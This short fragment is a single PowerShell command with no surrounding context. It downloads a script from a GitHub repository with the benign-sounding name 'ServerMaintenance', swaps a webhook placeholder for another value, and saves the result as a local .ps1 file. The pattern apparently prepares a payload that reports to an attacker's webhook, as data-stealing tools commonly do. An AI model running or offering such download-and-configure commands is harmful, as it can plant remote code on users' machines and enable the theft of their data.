...
powershell -c "$t = Iwr -Uri 'https://raw.githubusercontent.com/Masterpcex/ServerMaintenance/main/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'YOUR_WEBHOOK_HERE2' | Out-File -FilePath 'powershell123.ps1' -Encoding ASCII"
